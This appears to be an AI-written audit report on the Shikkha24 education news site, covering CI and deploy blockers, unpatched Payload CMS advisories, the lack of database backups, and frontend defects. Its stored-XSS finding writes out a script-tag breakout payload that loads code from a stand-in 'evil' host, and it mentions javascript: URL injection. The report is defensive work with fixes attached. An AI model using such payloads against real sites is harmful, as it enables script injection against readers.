# Shikkha24 — Independent Audit Report

**File:** `.sps/opencodereport.md`
**Date:** 2026-10-09
**Scope:** Full read-only audit — Astro frontend, Payload CMS 3, deploy/CI/backup pipeline, configs, and docs-vs-build parity.
**Method:** Static reading + `tsc --noEmit` + `biome check` + `pnpm audit --audit-level=high` + real Apache test + real `zip`/`unzip` test + live GitHub Actions run logs (`gh run view --log-failed`) + `git` inspection. Nothing was modified or committed by this audit.

**Verdict: NOT deploy-ready.** CI is red on every push, the CMS deploy script cannot execute, 21 unignored critical/high advisories sit on a public admin, and there is currently no working path to back the database up. Five of these are hard blockers.

> ⚠️ **Read this first — a shared working tree.** Two agent sessions were writing to this repo during the audit. `scripts/deploy-cms.mjs` (mtime 18:31:50) and `scripts/verify-cpanel-deploy.mjs` (mtime 18:46:19) were both modified mid-session; neither was modified when this audit began. **Stop one of the two agents.** The syntax error in Blocker 1 is almost certainly a concurrent session's in-progress change, not committed work — `git show HEAD:scripts/deploy-cms.mjs` is valid. This report treats the *committed* state as the source of truth and flags the working-tree breakage separately.

---

## BLOCKER — stops deployment or takes the site down

### B1. `scripts/deploy-cms.mjs` is a hard syntax error (working tree only)
`scripts/deploy-cms.mjs:240`
```
 *
SyntaxError: Unexpected token '*'
```
An edit destroyed the opening `/**` of `verifyCms`'s doc comment. `node --check` fails, so `node scripts/deploy-cms.mjs` dies before executing a line, and `pnpm lint` fails with 15 errors because of it. **The committed version (`HEAD`) is valid** — this is working-tree-only breakage from the concurrent session. Fix: restore the `/**` before ` * A cold start takes 5–15 seconds…`.

### B2. Same file, line 326 — missing `await` on an async function
```js
const current = buildManifest(CMS_DIST)   // `export async function buildManifest`
```
`deploy-static.mjs:150` correctly does `await buildManifest(DIST)`. Here `current` is a `Promise`, so `directoriesOf(current)` throws `current.split is not a function`. Even if it didn't, `currentSet.has(path)` would always be `false`, so the "clear before extract" fix would **silently no-op** — the exact defect it was written to fix.

### B3. `deploy-cms.mjs:61` — `??` where `||` is required; empty string wins
```js
const CMS_ROOT = process.env.DEPLOY_CMS_ROOT ?? 'shikkha24-cms'
```
`deploy.yml:385` sets `DEPLOY_CMS_ROOT: ${{ inputs.cms-root || vars.DEPLOY_CMS_ROOT }}`, and the input's own description says *"Leave empty for shikkha24-cms"*. GitHub Actions sets an unset expression to `''`, and `'' ?? 'shikkha24-cms'` is `''`. Verified:
```
with ?? : ""      → upload target: "/cms-deploy.zip"
with || : "shikkha24-cms"
```
A live CMS deploy therefore targets the **account home directory** instead of `~/shikkha24-cms`.

### B4. CI on `main` is red on every push — CI/deploy divergence
Every recent CI run failed (`37786930770`, `37776855035`, `37766729074`, `37763646501`, `37758294676`) while Deploy runs went green. Root cause is a **divergence**: `deploy.yml:353` was fixed to `node scripts/promote-pnpm-fallback.mjs`, but `ci.yml:532` still has the old broken `cp -Rn`, which fails:
```
##[error]pnpm hoist not promoted - the host could not resolve @libsql/core
```
**Fix:** replace `ci.yml:531-536` with the same `promote-pnpm-fallback.mjs` call `deploy.yml` uses.

### B5. Deploys are not gated on CI, and there is no branch protection
`deploy.yml` has **no `needs:` and no `workflow_run`** — it fires independently of CI. Branch protection is unavailable: the repo is **private on a free plan**, so `gh api .../branches/main/protection` returns HTTP 403. Combined with B4, **red CI blocks nothing**: broken code deploys while the pipeline reports failure. Fix: gate `deploy.yml` on a green CI run (or a required status check via GitHub Pro / a public repo), and never deploy on `push` without it.

---

## CRITICAL

### C1. Security policy documents a false pass — 21 unignored critical/high advisories, 16 patched and unpinned
`docs/security.md` §9.1 states the policy tolerates **exactly two** advisories, both *"Patched versions: None"*. That is no longer true:
```
$ pnpm audit --audit-level=high
43 vulnerabilities found
Severity: 5 low | 15 moderate | 20 high (2 ignored) | 3 critical
```
**16 of the unignored advisories are in `payload` itself — every one patched in `>=3.90.0`. The project is pinned to 3.89.0.** `pnpm-workspace.yaml`'s own comment reasons about *"the latest `payload@3.90.2`"*, so the fixed line was known and left unpinned. `.sps/plan.md:83` even flagged this: *"Payload 3.89.0 was published one day before being pinned. S0 must evaluate whether to hold 3.89.0 …"* — the re-evaluation never happened.

The severe set (all live on a public admin handling editor credentials and reader PII):

| Severity | Advisory | Reachable here? |
|---|---|---|
| CRITICAL | Field access-control bypass on auth collections | Undermines the whole `access/` layer |
| CRITICAL | Unauthorized update to collection documents | — |
| CRITICAL | Auth token field handling issue | Session integrity |
| HIGH | **SQL injection in SQLite/Postgres** (`@payloadcms/db-sqlite`) | **Yes — this project is SQLite** |
| HIGH | **Bypassed sanitization of user-uploaded SVGs** | **Yes — `Media.ts:66` allows `image/svg+xml`, `read: () => true`** |
| HIGH | **Uploaded XML executes same-origin JavaScript** | **Yes — same origin, public read** |
| HIGH | API key disclosure via ordinary document reads | Yes |
| HIGH | Polymorphic join queries could disclose hidden fields | Yes |
| HIGH | Remote Code Execution through first-register | **No — verified unreachable** (`Users` has `create: isSuperAdmin`, `Readers` has `create: noOne` + `disableLocalStrategy`) |
| HIGH | `next` SSRF in Image Optimization (patched `>=16.3.8`, pinned `16.3.5`) | Yes |
| HIGH | `sharp` librsvg, `extract-zip` symlink traversal, `basic-ftp` DoS, `tmp` path traversal, `source-map-js` DoS | Build/runtime |

**Why nobody noticed — the part that matters most:** CI's `Dependency audit` step *would* fail (`ci.yml:566`), but the job dies earlier at `ci.yml:475` on B4. The audit gate has been **unreachable behind an earlier failure**, so every push reports red for an unrelated reason while a green-looking security policy aged into fiction. And `pnpm audit` is **not** in the root `verify` chain, so `pnpm verify` passes locally too.
**Fix:** bump the `@payloadcms/*` set to `3.90.x` (or the latest), update the `pnpm-workspace.yaml` overrides, rewrite `docs/security.md` §9.1, and add `audit:ci` to the root `verify` chain.

### C2. Stored XSS — untrusted CMS text emitted as raw HTML inside `<script>` (4 sinks)
`frontend/src/layouts/Layout.astro:206`, `components/Breadcrumbs.astro:74`, `components/ArticleAudio.astro:76`, `components/QuizRunner.astro:62`
```astro
<script type="application/ld+json" set:html={JSON.stringify(jsonLd)} />
```
`set:html` is raw, unescaped output, and the HTML tokenizer terminates a `<script>` element at the first `</script` sequence **regardless of the `type` attribute** — so even the `type="application/json"` sinks are exposed. `JSON.stringify` does not escape `<`. The payload carries CMS text directly: `headline: article.title`, `description: article.excerpt`, `name: category.nameBn`, and `ArticleAudio` carries the **whole article body**. An article title or body containing `</script><script src=//evil/x.js>` escapes the tag and executes on every page, bypassing the careful escaping in `lib/richtext.ts` / `lib/html.ts`.
**Fix:** sanitize `<` before stringify — e.g. `JSON.stringify(x).replaceAll('<', '\\u003c')` — at every sink, or use Astro's escaping for the script body.

### C3. There is currently no working path to back the database up
Two independent blockers combine (`.sps/handoff.md` → Current Phase):
1. **The host cannot fork.** Cron fires but every run dies at `/usr/local/cpanel/bin/jailshell: fork: retry: Resource temporarily unavailable` (EAGAIN from CloudLinux). The host-side dump (`scripts/host-backup-dump.sh`) has therefore **never run**.
2. **The owner has no cPanel Terminal** (confirmed by the owner, 2026-10-09).

The documented manual workaround — *"run ~/bin/shikkha24-backup-dump.sh by hand"* — is therefore **impossible**. cPanel File Manager cannot execute scripts. **No archive is ever produced, on-host or off-host.** The entire editorial archive (every article, education record, reader account) lives in one SQLite file on a 5 GB shared account with no redundancy. The CI workflow (`backup-db.yml`) fails daily trying to fetch an archive that does not exist.
**Fix:** raise the CloudLinux `nPROC`/LVE limit via the DianaHost support ticket (already open), or move the dump to a path that does not need `fork` on the host (e.g. an on-demand HTTP endpoint triggered from CI), and restore cPanel Terminal access.

### C4. Three documented recovery procedures are dead instructions (require Terminal the owner doesn't have)
1. `scripts/deploy-cms.mjs:268-270` — on a broken venv, the error tells the operator: *"Repair with docs/deployment-runbook.md §3.4 — run the venv loop in cPanel Terminal, then restart."*
2. `docs/deployment-runbook.md` §3.4 — the venv repair is a Terminal procedure.
3. `.github/workflows/backup-db.yml:164` — *"run ~/bin/shikkha24-backup-dump.sh by hand and read the error."*

All three presuppose a capability the owner has confirmed they lack. A recovery procedure that cannot be executed is worse than none, because it is the thing a tired person follows at 3am.
**Fix:** replace each with a Terminal-free path (cPanel File Manager + an HTTP-triggered repair endpoint), or state plainly that the step needs DianaHost support.

---

## MAJOR

### M1. The Lighthouse gate is weaker than the plan it enforces, and three mandated budgets are enforced nowhere
`.sps/plan.md:331-338` mandates Lighthouse Performance **≥95**, LCP **<1.5s**, INP **<100ms**, CLS **<0.02**, data-saver **<30KB**. `lighthouserc.json` asserts only `performance: 0.9` (not 0.95), `CLS 0.03` (not 0.02), payload, and a11y. **LCP, INP and the 30KB data-saver budget have zero assertions anywhere in the repo** (grep confirms no occurrences). CI's own comment (`ci.yml`) admits *"Enforced in CI: perf ≥90, a11y ≥90, SEO ≥90, CLS ≤0.03, payload ≤1.2 MB"* — a self-documented deviation from rule 9.

### M2. Fake rotating ad creatives ship to real readers by default
`components/AdSlot.astro:79-97` + `components/DemoAd.astro`. `flag()` (`lib/feature-flags.ts:17-19`) returns `value !== 'false'`, so an unset `PUBLIC_FLAG_ADS` is **true** — the default production state. With no CMS ad unit, every slot renders fabricated creatives (*"এইচএসসি ভর্তি প্রস্তুতি — অনলাইন ব্যাচ — ফ্রি ক্লাস"*), **confirmed in the shipped output**: `dist/index.html` carries 4 `data-ad-slot` and the demo text 4×. Each `DemoAd` runs a `setInterval(…, 4000)` with **no `clearInterval` anywhere in the file** — a permanent 4s timer per slot (4+ on the homepage) against the INP/CPU budget. Simulated advertisements on a live news portal also misrepresent the site to readers and advertisers.
**Fix:** default `PUBLIC_FLAG_ADS` to `false` until real units exist, or make `AdSlot` self-hide when no unit resolves.

### M3. `localhost:3000` is baked into shipped client bundles
`frontend/src/lib/interactive.ts:82-90` falls back to `import.meta.env.CMS_URL` when `PUBLIC_CMS_ORIGIN` is empty, and `.env.example:23` ships `CMS_URL=http://localhost:3000` as the documented default. **Confirmed in the build**: `http://localhost:3000` appears in `dist/_astro/LiveBlogTimeline.*.js` and `dist/_astro/bookmark-sync.*.js`, and `dist/citizen/index.html` carries `data-origin="http://localhost:3000"`. The `.htaccess` `connect-src` allows only `https://cms.shikkha24.com`, so every comment/poll/newsletter/live-blog submit is CSP-blocked with no error — the opposite of the documented self-hiding contract (`.env.example:38-46`). Note the current `frontend/dist/` on disk is a **dev build and must never be deployed**.
**Fix:** return `null` (self-hide) when `PUBLIC_CMS_ORIGIN` is unset, instead of falling back to a build-time `CMS_URL`.

### M4. `/article/:slug` self-redirect → infinite meta-refresh loop
`frontend/src/pages/article/[slug].astro:28-40`
```js
newUrl: p.categorySlug ? articleUrl({…}) : `/article/${p.slug}`,
…
const canonical = new URL(newUrl, Astro.site ?? Astro.url).href
```
When `getAllArticlePaths()` yields a row with no populated `category.slug`, `newUrl` becomes the page's **own** URL, and line 48 emits `<meta http-equiv="refresh" content="0; url=<self>">` — the browser reloads forever. Reachable: `[category]/[id]/[slug].astro:67` **filters out** `!p.categorySlug`, so exactly those articles get no real page but *do* get the looping stub.
**Fix:** skip generating the stub when `categorySlug` is absent, or point the stub at the site root rather than itself.

### M5. Nine CMS-controlled URLs go into `href` without scheme validation
`safeExternalUrl()` (`lib/url.ts`) exists for exactly this and is applied only in `fact-check/[id].astro:69-71`. Everywhere else is raw:
`institutions/[slug].astro:173,186,238,273,293`, `circulars/index.astro:90`, `results/index.astro:56,57`, `scholarships/index.astro:148`, `AdCreative.astro:69`.
`AdCreative.astro:11-15` *claims* a stored-HTML field would be XSS — but `targetUrl` is a plain text field and is unvalidated. `institutions/[slug].astro` is the highest risk: 724 rows were machine-imported (S19/S20), so `website`/`sourceUrl` came from Wikidata, not an editor. A `javascript:` value executes on click.

### M6. `/contact` renders the raw CMS `social` map into `href` — XSS and English labels
`frontend/src/pages/contact.astro:32,114-122` — `Object.entries(settings.social)` → `<a href={url}>` with no `safeExternalUrl()`, and `{name}` is the raw CMS key (`facebook`, `youtube`, …) — **English in a Bengali-only UI**, violating rule 10. `lib/social.ts:8-18` was created precisely to eliminate both defects; `contact.astro` is the one surface that still has them.

### M7. Article clock times render in the build machine's timezone, not Dhaka
`pages/index.astro:319-323` and `components/LatestFeed.astro:27-31` call `toLocaleTimeString('bn-BD', …)` with **no `timeZone`**. Every other date goes through `formatBnBd(…, { timeZone: 'Asia/Dhaka' })` (`lib/bangla-date.ts:121-128`, written because *"in CI (UTC) a story published at 02:00 Dhaka displays as 31 August"*). On a result-day burst the homepage's "সর্বশেষ" list shows times **6 hours behind** the dates printed above them on the same page.

### M8. Archive month buckets (Dhaka) and archive month listings (UTC) disagree
`lib/cms.ts:1147` buckets by `getDhakaYearMonth(publishedAt)` but `lib/cms.ts:1170-1171` lists by `Date.UTC(...)`. A story published `2026-08-31T20:00Z` (= 01:00 Dhaka, 1 Sep) is counted in `/archive/2026-09` but excluded from that month's listing and included in `/archive/2026-08`. `/archive` prints "N টি খবর" while the month page shows N−k, for the first and last six hours of every month.

### M9. Touch targets below the 48×48px gate (rule 9)
`Pagination.astro:56,73,80,92` → 40px (the **only** way to reach page 2 of any listing); `ArticleAudio.astro:46,58` → 36px; `reporters/[slug].astro:293,301` → 36px; `SocialLinks.astro:113` → 44px; `ThemeToggle.astro:21` → 40px; `Header.astro:150,203` → 40px, `Header.astro:84` → 32px; `TextResizer.astro:18,27,36` → 32px. `--spacing-touch: 3rem` is declared (`global.css:89`) but applied to none of these.

### M10. `--color-ink-subtle` fails WCAG AA and is used 139×
`global.css:30` — `--color-ink-subtle: #8a8a8a` is **3.45:1** on white and 3.22:1 on `--color-surface-raised`. WCAG 2.2 AA requires 4.5:1. `DeveloperCredit.astro:31-34` *states this exact fact* and avoids it in one component — while it is the default token for dates, counts, category chips, breadcrumbs, bylines and footers across 139 occurrences. Given the Lighthouse accessibility ≥95 gate, this is systematic, not a one-off.

### M11. `public/llms.txt` advertises four category URLs that are never built
`frontend/public/llms.txt:22,24,25,28` links `/category/results`, `/category/exam`, `/category/circular`, `/category/teacher`. The approved taxonomy (`lib/cms.ts:154-163`) is `education-news, scholarship, admission, university, higher-study, study-abroad, exams-results, jobs-career`. `llms.txt` is served verbatim to every AI crawler, `robots.txt:25` allows them, and `verify-links.mjs` only scans built HTML — not `public/llms.txt`.

### M12. `FilterBar` island dies entirely where `localStorage` throws
`components/FilterBar.astro:172` — `localStorage.getItem(STORAGE_KEY)` is unguarded at IIFE top level. Every other storage touch in the project is wrapped (`lib/bookmarks.ts:56-65`, `lib/geo.ts:93-117`, `ReactionBar.astro:142-151`, `PollWidget.astro:198-207`). Where `window.localStorage` access throws (Firefox with cookies blocked; some private modes), this aborts the IIFE — no level pill, no district select, restore never runs — yet the `<select>` still renders: a visibly present, completely dead control.

### M13. Duplicate `BreadcrumbList` JSON-LD on four listing templates
`pages/category/[...path].astro:89-133` (and identically `tag/`, `author/`, `archive/`) — `Layout` emits a `BreadcrumbList` in `<head>` **and** `<Breadcrumbs>` emits another in the body. Verified in the build: `dist/category/admission/index.html` has 2 `application/ld+json` blocks. Google treats duplicate/conflicting `BreadcrumbList` as an error and drops breadcrumbs from the SERP — on the four highest-traffic listing templates.

### M14. `/reporters/:slug` 404s when a reporter is suspended — contradicting its own documented design
`pages/reporters/[slug].astro:21-27` documents *"getStaticPaths covers every author with a slug … a suspension takes effect as a change of state, not a vanishing page"*, but `:49-54` calls `getVerifiedReporters()`, which filters `verificationStatus == verified` (`lib/cms.ts:855-861`). Suspending a reporter **deletes** their profile at the next build, and the "এই প্রতিবেদকের যাচাই এখন সক্রিয় নয়" state at `:317-327` is unreachable. `/verify/:id` gets this right (`verify/[reporterId].astro:56-71` uses unfiltered `getAllReporterIds`).

### M15. The probe zip is built with an absolute path (latent)
`deploy-static.mjs:205-206` — `execFileSync('zip', ['-q', join(work, probeName), join(work, 'probe.txt')])` stores the file as `private/var/folders/…/probe.txt`, not `probe.txt` at the archive root (verified with a real `zip`/`unzip`). On this host the UAPI destination extract is absent, so the bug is masked; the day `extract_files` works, the probe would extract a `public_html/private/var/…/probe.txt` (publicly served junk) and the cleanup `deletePath(cfg, ${DOCROOT}/${probeName}, true)` would target a path that was never created there. **Fix:** `cd` into `work` or pass a relative filename.

---

## MINOR

- **`pages/cgpa.astro:300-310`** — `termsBox.innerHTML = '…' + term.term + …` splices a reader-typed value into `innerHTML` (self-XSS). `bookmarks.astro:136-142` and `login.astro:108-114` explicitly forbid this pattern.
- **`pages/[category]/[id]/[slug].astro:255`** — `speakable` references `article .article-excerpt`, a class that is never rendered (grep returns only this line). Half the declared speakable region is dead.
- **`lib/education.ts:281-288`** — `getAllStudyAbroadSlugs` is capped at `limit: 50`, single page, and feeds both `getStaticPaths` and `sitemap.xml.ts:72`. `getArchiveBuckets` and `getAllInstitutionSlugs` paginate for exactly this reason.
- **`lib/hijri.ts:75-81`** — `offsetDays` is a dead parameter (never read); `HeaderWidgets.astro:283` already applies `HIJRI_OFFSET` before the call, so the `:285` argument reads as if applied twice.
- **`lib/hijri.ts:29-31`** — `jumadaalthani` and `jumadaakhirah` both map to `জুমাদাস সানি`; Jumada al-Ākhirah is a different month. The header prints the wrong month name once per 30-month cycle.
- **`components/DeadlineStrip.astro:113`** — `deadline.relatedArticle` does not exist on `CmsDeadline` (`lib/cms.ts:475-485`), so the ternary is always `/deadlines`; if the field is ever added, every link silently becomes `#`.
- **`frontend/public/.htaccess`** — no `ErrorDocument 404 /404.html`, so whether the styled `404.astro` is served depends on the host's compiled-in default.
- **`frontend/AGENTS.md`** instructs `npm run dev -w frontend`, but the root `package.json` has **no `workspaces` field** — the command fails. `pnpm-workspace.yaml:9` claims *"package.json still carries a `workspaces` field"* — it does not.
- **`AGENTS.md` / `CLAUDE.md` / `GEMINI.md` rule 7** says the plan is *"2 GB PNR, ~$47/year"*. `.sps/handoff.md` measured the actual product: **"DH 5GB SSD NVMe", Disk 215 M / 5120 M, TK 4899.00 BDT**. Both figures in all three mirrors are wrong (rule 12: change all three together).
- **`.sps/plan.md:235,295`** still records the host as Node 20.18.2 and frames EOL-Node-20 as an accepted risk; `.sps/handoff.md` measured **24.18.0** on 2026-10-04, so the risk is moot and the plan is stale on a security-relevant fact.
- **`frontend/.env.bak-1790836104`** lingers with `PUBLIC_OAUTH_GOOGLE_CLIENT_ID` / `PUBLIC_OAUTH_FACEBOOK_APP_ID` — vars no longer in `.env.example`. Git-ignored (verified), so not committed, but a removed config path is still on disk in plaintext.
- **`.sps/plan.md:259`** (S12 row) still says *"GitHub Actions pipeline (rsync deploy)"* — the deploy has been the cPanel API since the SSH ports were found closed.

---

## Tested and RETRACTED (do not "fix" these — they are not bugs)

- **`.htaccess` article CSP rule** `^/[^/?#]+/(?!page/)[^/?#]+/[^/?#]+/?$`. `grep -E` (POSIX ERE) rejects the lookahead, which suggests the regex is broken. It is **not**: Apache's `SetEnvIf` uses PCRE. Verified against a real Apache 2.4.67 — the rule matched `/a/1/slug` and correctly skipped `/latest/page/2`. `verify-apache.mjs` exercises it. **Do not change it.**
- **Git hygiene** — `payload.db`, `ci.db`, every `.db.bak-*` and `.env.bak-*` are correctly gitignored and untracked (`git check-ignore` + `git ls-files` both confirm).
- **The three agent-rule mirrors are not byte-identical** — but only by the self-referential filename line, which is correct and required. Not a violation.
- **The historical `DB_PUSH` blocker is genuinely closed** — `push: false`, committed Drizzle migrations, and `cms/.env.example:22` explicitly bans a `DB_PUSH` variable.
- **`verify:access` is gated in CI** — it runs **first** in the `ci.yml:294` harness loop. (Initially suspected missing; verified present.)
- **No dangling verify scripts** — all 12 harnesses the CI loop calls exist in `cms/package.json`.

## Checked and clean (so nobody re-audits them)

`tsc --noEmit` zero errors · `lib/gpa.ts` and `lib/cgpa.ts` math verified correct · `lib/bangla-date.ts` month lengths, ফাল্গুন leap day, 14-April turnover correct · `lib/url.ts` `safeExternalUrl` correct · `lib/richtext.ts`/`lib/content-blocks.ts`/`lib/html.ts` escaping complete for text sinks · `lib/media.ts` `buildSrcset` dedupes/sorts correctly · `lib/bookmark-sync.ts`/`bookmark-merge.ts` server-authoritative merge · `lib/prayer.ts` wrap-around and `minutesUntil` off-by-one verified · `.htaccess` CSP route dispatch traced against all three `SetEnvIf` regexes with no collisions · `public/sw.js` caches nothing, `push`/`notificationclick` payloads validated and path-guarded · `public/theme-init.js` ES5, blocking, no undefined tokens · `astro.config.mjs` `output: static`, `trailingSlash: never`, `assetsInlineLimit: 0` all correct and justified · `fonts.css` correct `unicode-range` (U+0980-09FF) · no duplicate element IDs across component instances · zero broken page links in the current `dist/`.

## Coverage gaps (be honest about what was NOT audited)

Two of the three parallel audits (CMS-collection internals beyond access control, and full `.env`/docs parity) were launched but **did not return results**, so those areas are covered only by the targeted checks recorded above — notably the access-control review (`Users`, `Readers`, `Media`) and the dependency/audit verification, which were done by hand. The CMS `collections/` beyond those three, `endpoints/`, and `hooks/` were not exhaustively read in this pass.

## Verification log

| Claim | How verified |
|---|---|
| B1 syntax error | `node --check scripts/deploy-cms.mjs` → `SyntaxError: Unexpected token '*'`; `git show HEAD:…` valid |
| B2 missing await | `grep -n buildManifest scripts/` — `deploy-static.mjs:150` awaits, `deploy-cms.mjs:326` does not; `deploy-manifest.mjs:59` is `async` |
| B3 empty-string `??` | `node -e` with `process.env.DEPLOY_CMS_ROOT=''` → `""` vs `"shikkha24-cms"`; `deploy.yml:385` + input description |
| B4 CI red | `gh run list` (5 consecutive failures) + `gh run view 37786930770 --log-failed` → `pnpm hoist not promoted`; `ci.yml:532` vs `deploy.yml:353` |
| B5 no gate | `grep needs:/workflow_run` in `deploy.yml` → none; `gh api branches/main/protection` → HTTP 403 (private repo, free plan) |
| C1 advisories | `pnpm audit --audit-level=high` → 43 vulns, 20 high (2 ignored), 3 critical; `--json` parsed for patched versions; `cms/package.json` pins 3.89.0 |
| C2 XSS sinks | `grep -rn "set:html={JSON.stringify"` → 4 hits; Astro `set:html` is raw by documented semantics |
| C3/C4 no backup / dead steps | `.sps/handoff.md` fork-blocker evidence (EAGAIN from `jailshell: fork`); owner confirmation of no Terminal, 2026-10-09 |
| C4 reachability of RCE | `Users.ts:40` `create: isSuperAdmin`; `Readers.ts:77` `create: noOne` + `:52` `disableLocalStrategy` |
| M2 demo ads | `dist/index.html` → 4 `data-ad-slot`, demo text ×4; `feature-flags.ts:17-19`; `DemoAd.astro:112` `setInterval` with no `clearInterval` |
| M3 localhost baked | `grep -rl "http://localhost:3000" dist/_astro/*.js` → 2 bundles; `dist/citizen/index.html` `data-origin` |
| M4 redirect loop | `article/[slug].astro:28-40` + `[category]/[id]/[slug].astro:67` `.filter((p) => p.categorySlug)` |
| M15 probe zip | real `zip`/`unzip` test — absolute path stored as `private/var/…/probe.txt` |
| Retracted lookahead | real Apache 2.4.67 with a control pattern — matched `/a/1/slug`, skipped `/latest/page/2` |
| Working tree untouched by this audit | `git status --porcelain` → only the two pre-existing/concurrent changes |
